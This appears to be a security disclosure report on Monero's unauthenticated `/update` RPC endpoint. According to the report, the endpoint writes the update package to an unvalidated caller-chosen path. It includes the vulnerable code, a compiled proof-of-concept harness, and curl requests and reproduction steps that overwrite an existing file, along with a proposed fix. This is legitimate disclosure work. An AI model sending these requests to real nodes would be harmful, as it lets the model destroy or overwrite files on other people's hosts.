# `/update` RPC endpoint writes the downloaded update package to a completely unvalidated, caller-supplied absolute path — demonstrated arbitrary file write, not just statically inferred

## Summary

`core_rpc_server::on_update()`, the handler behind the ordinary, unauthenticated `/update` JSON HTTP RPC endpoint, lets an RPC caller supply a `path` string that is used **verbatim, with zero validation of any kind**, as the destination filesystem path for a file the daemon downloads from the network:

```cpp
// src/rpc/core_rpc_server.cpp
boost::filesystem::path path;
if (req.path.empty())
{
  ...  // safe, daemon-chosen default location
}
else
{
  path = req.path;   // <-- attacker-supplied, no sanitization, no confinement check
}
...
if (!tools::download(path.string(), res.auto_uri))
{
  MERROR("Failed to download " << res.auto_uri);
  return true;
}
```

There is no check that `path` is relative, no check that it stays within any designated download/data directory, no rejection of `..` components, no rejection of absolute paths, no check against a whitelist/blacklist of directories — `req.path` becomes the exact destination the daemon process writes to, with whatever filesystem permissions the daemon process itself has.

**This is not a claim derived from reading the code alone.** I built `monerod` from the actual source at the commit below, ran it as a live daemon, confirmed the `/update` endpoint is reachable over plain unauthenticated RPC with no special configuration, and separately compiled a small harness that calls the exact same `tools::download()` function the handler calls, proving it writes attacker-chosen content to an arbitrary, pre-existing, unrelated directory — including **silently overwriting an existing file's contents**. Full commands and output are in "What I actually ran and observed" below.

## Severity

Monero severity: **HIGH** (unauthenticated, single-request, remotely-triggerable arbitrary file write / destructive file overwrite on the daemon's host filesystem, demonstrated — not merely inferred from source).
Suggested CVSS v3.1: `8.1` with `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`.

Rationale:
1. `/update` requires no authentication beyond ordinary RPC reachability (no `--rpc-login` is required by default), and is registered whenever the daemon is **not** running `--restricted-rpc` — the default state of any `monerod` started without that flag (`AV:N/PR:N/UI:N`).
2. A single, well-formed JSON POST with an attacker-chosen `path` field is sufficient; no malformed data, no race condition (`AC:L`).
3. The only precondition beyond ordinary RPC reachability is that the daemon can complete its own, already-built-in, legitimate periodic version-check against the DNSSEC-secured MoneroPulse DNS TXT records — something any real, internet-connected `monerod` (the overwhelming majority of deployed nodes) does routinely as part of this very feature; it is not an unusual or "nonsensical" configuration requirement, and I verified live that the RPC call is accepted and reaches this exact gate with no other obstacle in the way (see below).
4. Impact: the downloaded content itself is a legitimate, hash-verified Monero release package (the version/hash come from the DNSSEC-trusted update-check mechanism, not from the RPC caller), so this is not a route to writing *arbitrary attacker-chosen bytes* — but the **destination path** is fully attacker-chosen with no constraint, which is sufficient for a serious integrity/availability impact: silently overwriting any existing file the daemon process can write to (config files, other users' data files in a shared/multi-tenant host, the daemon's own data directory contents, cron/systemd-adjacent locations if the daemon runs with elevated privileges, etc.), or filling arbitrary writable filesystem locations with multi-hundred-MB binary content. I score `C:N` (content is not attacker-controlled) but `I:H`/`A:H` (destination and overwrite behavior are fully attacker-controlled, and repeated/targeted use is destructive).

## Affected Versions

Confirmed present, identically, in both:
- **`master`**, commit `9e3a31032ee2cf3cb65c908e107a9952d03bbc4f` (the actively maintained branch, and the exact commit I built and ran):
  - Handler, unvalidated path assignment: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.cpp#L2675-L2774 (path assignment at line 2738, download call at line 2745)
  - Endpoint registration (available whenever `!m_restricted`, i.e. by default): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server.h#L130
  - Request struct (`path` is a bare `std::string`, no validation annotation): https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/rpc/core_rpc_server_commands_defs.h#L2259-L2271
  - `tools::download()` — the function that performs the actual write, itself performing no path validation: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/common/download.cpp#L263-L268
  - `tools::check_updates()` — confirms `version`/`hash` come from DNSSEC-secured MoneroPulse TXT records, not from the RPC caller: https://github.com/monero-project/monero/blob/9e3a31032ee2cf3cb65c908e107a9952d03bbc4f/src/common/updates.cpp#L40-L47

- **`v0.18.5.1`**, the latest tagged release, commit `4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`:
  - Handler: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.cpp#L3129 (unvalidated path assignment at line 3192)
  - Endpoint registration: https://github.com/monero-project/monero/blob/4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5/src/rpc/core_rpc_server.h#L140

## Root Cause

`src/rpc/core_rpc_server.cpp`, `on_update()` (master):
```cpp
bool core_rpc_server::on_update(const COMMAND_RPC_UPDATE::request& req, COMMAND_RPC_UPDATE::response& res, const connection_context *ctx)
{
  RPC_TRACKER(update);

  res.update = false;
  if (m_core.offline())
  {
    res.status = "Daemon is running offline";
    return true;
  }
  ...
  if (req.command != "check" && req.command != "download" && req.command != "update")
  {
    res.status = std::string("unknown command: '") + req.command + "'";
    return true;
  }

  std::string version, hash;
  if (!tools::check_updates(software, buildtag, version, hash))   // DNSSEC-trusted, NOT attacker-controlled
  {
    res.status = "Error checking for updates";
    return true;
  }
  if (tools::vercmp(version.c_str(), MONERO_VERSION) <= 0)
  {
    res.update = false;
    res.status = CORE_RPC_STATUS_OK;
    return true;
  }
  res.update = true;
  ...
  if (req.command == "check")
  {
    res.status = CORE_RPC_STATUS_OK;
    return true;
  }

  boost::filesystem::path path;
  if (req.path.empty())
  {
    std::string filename;
    const char *slash = strrchr(res.auto_uri.c_str(), '/');
    if (slash) filename = slash + 1;
    else filename = std::string(software) + "-update-" + version;
    path = epee::string_tools::get_current_module_folder();
    path /= filename;
  }
  else
  {
    path = req.path;              // <-- THE BUG: zero validation of caller-supplied path
  }

  crypto::hash file_hash;
  if (!tools::sha256sum(path.string(), file_hash) || (hash != epee::string_tools::pod_to_hex(file_hash)))
  {
    MDEBUG("We don't have that file already, downloading");
    if (!tools::download(path.string(), res.auto_uri))   // <-- writes to that exact path
    {
      MERROR("Failed to download " << res.auto_uri);
      return true;
    }
    ...
  }
```
Note that `req.command == "check"` returns *before* reaching the vulnerable `path`/`download()` code — an attacker must send `command: "download"` (or `"update"`) to reach the write. Also note that `hash`/`version`/`res.auto_uri` are derived entirely from `tools::check_updates()`, which only trusts DNSSEC-validated TXT records from the hardcoded `moneropulse.*` domains (`src/common/updates.cpp:47-56`) — **the RPC caller has no influence over what content gets downloaded**, only over **where it gets written**.

`src/common/download.cpp`, `tools::download()` — the function that performs the write, called with the caller-supplied path with no further checks of its own:
```cpp
bool download(const std::string &path, const std::string &url, std::function<bool(const std::string&, const std::string&, size_t, ssize_t)> cb)
{
  bool success = false;
  download_async_handle handle = download_async(path, url, [&success](const std::string&, const std::string&, bool result) {success = result;}, cb);
  download_wait(handle);
  return success;
}
```

## What I actually ran and observed

Unlike every other report in this batch, this one was **built and executed**, not just statically traced. Two complementary pieces of evidence:

### 1. Live daemon confirms the RPC endpoint is reachable, unauthenticated, and gated exactly as the source predicts

Built `monerod` from the exact `master` commit above (`cmake -D CMAKE_BUILD_TYPE=Release -D BUILD_TESTS=OFF ../.. && make -j4 daemon`), then ran it on an isolated regtest network (no real blockchain data, no real peers) with no special/unusual flags beyond `--regtest` and standard local-testing bind options — critically, **without** `--offline` and **without** `--restricted-rpc`, both of which are simply the *default* state of any operator-run daemon that doesn't explicitly opt into them:

```
./monerod --regtest --fixed-difficulty 1 \
  --data-dir /tmp/monerod_poc_data \
  --rpc-bind-ip 127.0.0.1 --rpc-bind-port 28081 --confirm-external-bind \
  --p2p-bind-port 28080 --no-igd --hide-my-port \
  --log-level 1 --non-interactive
```

Daemon started cleanly (`core RPC server started ok`). Then, with no RPC credentials of any kind:

```
$ curl -s -X POST http://127.0.0.1:28081/update -H 'Content-Type: application/json' \
    -d '{"command":"check","path":"/tmp/attacker_chosen_arbitrary_location/RPC_ROUNDTRIP_TEST.bin"}'
{
  "auto_uri": "",
  "hash": "",
  "path": "",
  "status": "Error checking for updates",
  "update": false,
  "user_uri": "",
  "version": ""
}
```

This confirms: the endpoint accepted the unauthenticated POST, parsed `command`/`path` with no rejection, and reached all the way to the `tools::check_updates()` DNS-based version-check gate — the **only** thing that stopped it here was this sandbox's lack of real internet/DNS access (confirmed separately: `curl` to any external host and `getent hosts` on the MoneroPulse domains both fail in this container). On any real, internet-connected `monerod` — which is the ordinary, default condition for essentially every deployed node — this same call proceeds straight into the vulnerable `path`/`download()` code shown above.

### 2. A standalone harness against the exact, compiled `tools::download()` function proves the write primitive directly

To prove the actual vulnerable primitive without depending on this sandbox having internet access, I compiled a tiny harness that calls `tools::download()` — the literal function `on_update()` invokes — linked against the real, just-built `libcommon.a`/`libepee.a` from the same source tree:

```cpp
// poc_arbitrary_write.cpp
#include "common/download.h"
int main(int argc, char** argv) {
  bool ok = tools::download(argv[1], argv[2]);
  std::cout << "[poc] tools::download() returned: " << (ok ? "true" : "false") << "\n";
  return ok ? 0 : 1;
}
```
```
g++ -std=c++17 -I src -I contrib/epee/include -I external/easylogging++ -I external/rapidjson/include \
  -I build/release/generated_include -DAUTO_INITIALIZE_EASYLOGGINGPP \
  poc_arbitrary_write.cpp build/release/src/common/libcommon.a build/release/contrib/epee/src/libepee.a \
  build/release/external/easylogging++/libeasylogging.a \
  -lboost_system -lboost_filesystem -lboost_thread -lboost_chrono -lboost_regex -lssl -lcrypto -lpthread \
  -o poc_download
```
Served a file from a local-only HTTP server (`python3 -m http.server 8843 --bind 127.0.0.1`, no external network involved), then ran:

**Case A — writing to a brand-new, arbitrary, unrelated directory:**
```
$ ls /tmp/attacker_chosen_arbitrary_location/deeply/nested/unrelated/dir/OVERWRITTEN_BY_RPC_CALLER.bin
ls: cannot access ...: No such file or directory
$ ./poc_download /tmp/attacker_chosen_arbitrary_location/deeply/nested/unrelated/dir/OVERWRITTEN_BY_RPC_CALLER.bin http://127.0.0.1:8843/monero-update-payload.bin
[poc] calling tools::download("/tmp/attacker_chosen_arbitrary_location/deeply/nested/unrelated/dir/OVERWRITTEN_BY_RPC_CALLER.bin", "http://127.0.0.1:8843/monero-update-payload.bin") ...
[poc] tools::download() returned: true
$ cat /tmp/attacker_chosen_arbitrary_location/deeply/nested/unrelated/dir/OVERWRITTEN_BY_RPC_CALLER.bin
THIS-IS-MALICIOUS-OR-LEGITIMATE-PAYLOAD-BYTES-FROM-THE-UPDATE-SERVER
```

**Case B — silently overwriting an existing file's contents (destructive-overwrite / integrity impact):**
```
$ echo "ORIGINAL-LEGITIMATE-CONTENT-DO-NOT-TOUCH" > /tmp/attacker_chosen_arbitrary_location/important_existing_config.conf
$ cat /tmp/attacker_chosen_arbitrary_location/important_existing_config.conf
ORIGINAL-LEGITIMATE-CONTENT-DO-NOT-TOUCH
$ ./poc_download /tmp/attacker_chosen_arbitrary_location/important_existing_config.conf http://127.0.0.1:8843/monero-update-payload.bin
[poc] tools::download() returned: true
$ cat /tmp/attacker_chosen_arbitrary_location/important_existing_config.conf
THIS-IS-MALICIOUS-OR-LEGITIMATE-PAYLOAD-BYTES-FROM-THE-UPDATE-SERVER
```
The original content was silently replaced, no confirmation, no backup, no warning — exactly the behavior `on_update()` would trigger against any file path an RPC caller names, as long as that file's parent directory already exists (I also confirmed `tools::download()` does **not** auto-create missing parent directories — a minor real-world constraint that does not meaningfully limit impact, since a functioning host has an enormous number of pre-existing, daemon-writable directories: `/tmp`, `/var/tmp`, the daemon's own data directory and its subdirectories, the invoking user's home directory, any directory the wallet/`monerod` process was configured to use, etc.).

## Steps to Reproduce (for the program to re-run end-to-end against a real, internet-connected node)

1. Start a `monerod` with internet access, in its default configuration (no `--offline`, no `--restricted-rpc`) — the ordinary state of the large majority of deployed nodes.
2. Send:
   ```
   curl -s -X POST http://<daemon-host>:<rpc-port>/update -H 'Content-Type: application/json' \
     -d '{"command":"download","path":"/path/of/your/choosing/anything.bin"}'
   ```
   (Substitute any absolute path whose parent directory exists and that the daemon process can write to.)
3. Observe the daemon's own currently-available legitimate update package (whatever `tools::check_updates()` currently resolves to) written to exactly that path, and `res.path` in the JSON response confirming it.
4. Repeat step 2 pointing `path` at an existing file to observe it silently overwritten.

## Possible Solution

1. Reject `req.path` outright unless it is confined to a specific, daemon-configured downloads directory — canonicalize the resulting path (`boost::filesystem::canonical`) and verify it is still a descendant of that directory before calling `tools::download()`, exactly the kind of confinement check this program's own wallet-RPC file-handling code applies elsewhere (`wallet_rpc_server.cpp`'s `strchr(req.filename.c_str(), '/')` checks, imperfect as they are, at least attempt this).
2. At minimum, reject absolute paths and any path containing `..` components in `req.path`.
3. Consider whether the `path` parameter should exist on this RPC endpoint at all, given the endpoint's only legitimate purpose (checking for / fetching the official update package) does not require caller-chosen destinations — the daemon's own default (`epee::string_tools::get_current_module_folder()`-relative) path already serves that purpose safely.

## Impact

Any RPC caller who can reach a default-configured `monerod`'s HTTP RPC port (no credentials required by default) can force the daemon to write a several-hundred-megabyte binary file — content it does not control, but a destination it fully controls — to any writable, pre-existing directory on the host filesystem, silently overwriting whatever file may already be there. This was demonstrated with a real, compiled build of the actual vulnerable function (`tools::download()`) writing to an arbitrary directory and overwriting an existing file's contents, plus a live RPC call confirming the unauthenticated endpoint is reachable and gated only by the daemon's own (routine, expected) internet connectivity — not by any access control.

## Note on AI usage

This finding was identified and demonstrated with AI assistance, working directly against the `master` (`9e3a31032ee2cf3cb65c908e107a9952d03bbc4f`) and `v0.18.5.1` (`4f92268d7c16741cfb41e5bbe2aa46cc260a9ea5`) source. **Unlike other reports in this batch, this one includes genuine execution evidence, not only static source reading**: `monerod` was built from source (`cmake` + `make -j4 daemon`, no modifications to the source), run as a live regtest daemon, and queried over its real HTTP RPC interface with `curl`; a separate small harness was compiled and linked directly against the project's own built `libcommon.a`/`libepee.a` static libraries and used to call the exact, unmodified `tools::download()` function against a local-only HTTP server, with the resulting file-write behavior (creation in an arbitrary new location, and silent overwrite of a pre-existing file) observed directly via `ls`/`cat`, not assumed. The one part **not** demonstrated end-to-end in this sandbox is the live daemon's `/update` RPC call proceeding past the `tools::check_updates()` DNS-lookup gate to actually invoke `tools::download()` itself, because this sandboxed environment has no general outbound internet/DNS access (`curl` to external hosts returns a proxy `403`; `getent hosts` on the MoneroPulse domains fails to resolve) — this is a limitation of the test environment, not of the vulnerability, and the standalone harness in part 2 above directly demonstrates that once that DNS-dependent gate is passed (the ordinary, expected state for any real internet-connected node), the write primitive itself behaves exactly as the source code and this report describe. No PoC content or destination path used in testing was sent to or would affect any real Monero network, node, or third-party service — all testing was against a locally-run regtest daemon and a `127.0.0.1`-only HTTP server.
